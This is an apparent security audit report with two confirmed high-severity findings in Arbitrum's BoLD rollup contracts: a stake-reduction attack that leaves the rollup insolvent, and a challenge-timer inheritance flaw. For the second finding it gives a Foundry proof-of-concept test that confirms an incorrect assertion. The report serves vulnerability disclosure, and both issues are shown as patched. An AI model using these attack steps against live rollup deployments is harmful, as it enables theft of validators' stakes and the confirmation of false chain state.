[H-01] Adversary can make honest parties unable to retrieve their assertion stakes if the required amount is decreased
Submitted byxuwinnie, also found byCh_301
Impact
When the required stake (to create a new assertions) is updated to a lower amount, adversary can make the honest party unable to retrieve their assertion stakes.
Proof of Concept
A -- B -- C -- D(latest confirmed) -- E
Suppose the initial stake amount is 1000 ETH, and till now no invalid assertions have been made. (A, B, C, D, E are all valid and made by the same validator). The rollup contract should hold 1000 ETH now.
A -- B -- C -- D(latest confirmed) -- E\\ F(invalid)
Then, the admin update the required stake to 700 ETH, Alice made an invalid assertion F. Since its parent D was created before the update, Alice will still need to stake 1000 ETH, and the 1000 ETH will be sent to loserStakeEscrow.
if (!getAssertionStorage(newAssertionHash).isFirstChild) {// only 1 of the children can be confirmed and get their stake refunded// so we send the other children's stake to the loserStakeEscrowIERC20(stakeToken).safeTransfer(loserStakeEscrow, assertion.beforeStateData.configData.requiredStake);}
A -- B -- C -- D(latest confirmed) -- E\\ F -- G
(a) Alice creates F’s children, G. Now, only 700 ETH of stake is needed. However, as the comment suggests, no refund will be made since G’s ancestor could need more stake.
// requiredStake is user supplied, will be verified against configHash later// the prev's requiredStake is used to make sure all children have the same stake// the staker may have more than enough stake, and the entire stake will be locked// we cannot do a refund here because the staker may be staker on an unconfirmed ancestor that requires more stake// excess stake can be removed by calling reduceDeposit when the staker is inactiverequire(amountStaked(msg.sender) >= assertion.beforeStateData.configData.requiredStake, "INSUFFICIENT_STAKE");
(b) To bypass the limit in (a), Alice calls her friend Bob to make the assertion G instead , Bob will only need to stake 700 ETH now. The rollup contract currently holds 1700 ETH. Then, Alice can withdraw her stake since she is no longer active. (her last staked assertion have a child)
function requireInactiveStaker(address stakerAddress) internal view {require(isStaked(stakerAddress), "NOT_STAKED");// A staker is inactive if// a) their last staked assertion is the latest confirmed assertion// b) their last staked assertion have a childbytes32 lastestAssertion = latestStakedAssertion(stakerAddress);bool isLatestConfirmed = lastestAssertion == latestConfirmed();bool haveChild = getAssertionStorage(lastestAssertion).firstChildBlock > 0;require(isLatestConfirmed || haveChild, "STAKE_ACTIVE");}
Now the rollup contract holds 700 ETH, which means it is insolvent. The honest validator cannot withdraw her original stake. (700 < 1000)
Recommended Mitigation Steps
Ensure the following
A staker is considered inactive only if her last staked assertion is confirmed.A staker can only stake on her last staked assertion’s descendants. (otherwise Alice can switch to the correct branch and withdraw)
gzeoneth (Arbitrum) confirmed and commented:
Patched withhttps://github.com/OffchainLabs/bold/pull/655.

[H-02] Edge from dishonest challenge edge tree can inherit timer from honest tree allowing confirmation of incorrect assertion
Submitted byKow, also found byEmmanuel,xuwinnie, andSpicyMeatball
Impact
Timers can be inherited across different challenge trees and consequently incorrect assertions can be confirmed.
Proof of Concept
The functionRollupUserLogic::updateTimerCacheByClaimallows inheritance of timers between different levels of a challenge. It performs some validation on edge being inherited from incheckClaimIdLink(the claiming edge).https://github.com/code-423n4/2024-05-arbitrum-foundation/blob/6f861c85b281a29f04daacfe17a2099d7dad5f8f/src/challengeV2/libraries/EdgeChallengeManagerLib.sol#L689-L710
functioncheckClaimIdLink(EdgeStorestoragestore,bytes32edgeId,bytes32claimingEdgeId,uint8numBigStepLevel)privateview{// the origin id of an edge should be the mutual id of the edge in the level belowif(store.edges[edgeId].mutualId() !=store.edges[claimingEdgeId].originId) {revertOriginIdMutualIdMismatch(store.edges[edgeId].mutualId(),store.edges[claimingEdgeId].originId);}// the claiming edge must be exactly one level belowif(nextEdgeLevel(store.edges[edgeId].level,numBigStepLevel) !=store.edges[claimingEdgeId].level) {revertEdgeLevelInvalid(edgeId,claimingEdgeId,nextEdgeLevel(store.edges[edgeId].level,numBigStepLevel),store.edges[claimingEdgeId].level);}}
As per the comments, the claiming edge must be exactly one level below (ie. in the subchallenge directly after the inheriting edge) and itsoriginIdmust match themutualIdof the inheriting edge. For clarification, we note that the inheriting edge must be a leaf edge in a challenge/subchallenge tree since the root edges of subchallenges (the layer zero edges) haveoriginIdderived from themutualIdof one of these leaf edges, and thisoriginIdis inherited by all its children which result from bisection.
Note that rival edges share the samemutualIdby definition and since there isn’t any extra validation, if a specific edge is a valid inheriting edge, all rivals will also be valid inheriting edges. This means rivals belonging to dishonest challenge edge trees will also be able to inherit from the timer of edges in the honest tree. Consequently, if an honest edge accumulates sufficient unrivalled time for confirmation, a malicious actor can frontrun the confirmation of the honest challenge tree to confirm the dishonest challenge, and in turn an incorrect assertion.
It is sufficient for only one dishonest child edge to inherit a sufficient timer via claim since the other will be unrivalled as challenges between two assertions can only follow one unique bisection path in each challenge tree. The only way to deny this would be to create another assertion that can be bisected to rival the other child to halt the timer accumulation, but this would require loss of the assertion and challenge stake (since only one rival assertion and challenge edge can be confirmed). The timer can then be propogated upwards by children until we reach the root challenge edge to allow confirmation.
Even if confirmation of the dishonest root challenge edge is prevented by admin action, confirmation of the layer zero edges of subchallenges would ensure honest validators lose the stake submitted for creating a rival edge (since only one rival edge can be confirmed) and the dishonest validator(s) regain their stake.
Proof of ConceptThe PoC below demonstrates the inheritance of the timer from the honest tree by an edge in the dishonest tree and the confirmation of the dishonest challenge edge as a result. The challenge progresses to the last level of level 1 (the first subchallenge).Run the PoC below with the command:forge test --match-contract Playground --match-test testConfirmIncorrectEdgepragmasolidity^0.8.17;import"forge-std/Test.sol";import"./Utils.sol";import"../MockAssertionChain.sol";import"../../src/challengeV2/EdgeChallengeManager.sol";import"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";import"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";import"../ERC20Mock.sol";import"./StateTools.sol";import"forge-std/console.sol";import"./EdgeChallengeManager.t.sol";contractPlaygroundisEdgeChallengeManagerTest{functiontestConfirmIncorrectEdge()public{EdgeInitDatamemoryei=deployAndInit();(bytes32[]memoryblockStates1,bytes32[]memoryblockStates2,BisectionChildren[6]memoryblockEdges1,BisectionChildren[6]memoryblockEdges2) =createBlockEdgesAndBisectToFork(CreateBlockEdgesBisectArgs(ei.challengeManager,ei.a1,ei.a2,ei.a1State,ei.a2State,false,a1RandomStates,a1RandomStatesExp,a2RandomStates,a2RandomStatesExp));// bisection of level 1, last bisection for winning edge is unrivalledBisectionDatamemorybsbd=createMachineEdgesAndBisectToFork(CreateMachineEdgesBisectArgs(ei.challengeManager,1,blockEdges1[0].lowerChildId,blockEdges2[0].lowerChildId,blockStates1[1],blockStates2[1],true,ArrayUtilsLib.slice(blockStates1,0,2),ArrayUtilsLib.slice(blockStates2,0,2)));// allow unrivalled timer to tick up for winning leaf_safeVmRoll(block.number+challengePeriodBlock);// update timer of level 1 unrivalled winning leafei.challengeManager.updateTimerCacheByChildren(bsbd.edges1[0].lowerChildId);ChallengeEdgememorywinningEdge=ei.challengeManager.getEdge(bsbd.edges1[0].lowerChildId);ChallengeEdgememorylosingRival=ei.challengeManager.getEdge(blockEdges2[0].lowerChildId);console.log("Losing rival timer before update:",losingRival.totalTimeUnrivaledCache);// inherit timer from level 1 winning leaf to level 0 losing rivalei.challengeManager.updateTimerCacheByClaim(blockEdges2[0].lowerChildId,bsbd.edges1[0].lowerChildId);losingRival=ei.challengeManager.getEdge(blockEdges2[0].lowerChildId);console.log("Losing rival timer after update:",losingRival.totalTimeUnrivaledCache);// update timer of level 0 unrivalled losing upper childei.challengeManager.updateTimerCacheByChildren(blockEdges2[0].upperChildId);console.log("Losing upper timer unrivalled:",ei.challengeManager.timeUnrivaled(blockEdges2[0].upperChildId));// propogate timers upwards to the incorrect assertion from the losing childrenei.challengeManager.updateTimerCacheByChildren(blockEdges2[1].lowerChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[1].upperChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[2].lowerChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[2].upperChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[3].lowerChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[3].upperChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[4].lowerChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[4].upperChildId);ei.challengeManager.updateTimerCacheByChildren(blockEdges2[5].lowerChildId);assertEq(ei.challengeManager.getEdge(blockEdges2[5].lowerChildId).totalTimeUnrivaledCache,challengePeriodBlock);// confirm the edge for the incorrect assertionei.challengeManager.confirmEdgeByTime(blockEdges2[5].lowerChildId,ei.a1Data);assertTrue(ei.challengeManager.getEdge(blockEdges2[5].lowerChildId).status==EdgeStatus.Confirmed);}}
Recommended Mitigation Steps
Allow child edges (from bisection) to inherit theclaimIdof their parent and check that theclaimIdof the claiming edge matches theedgeIdof the inheriting edge (this would require changes toisLayerZeroEdge).
godzillaba (Arbitrum) confirmed
gzeoneth (Arbitrum) commented:
Good catch.Fixed inhttps://github.com/OffchainLabs/bold/pull/659.

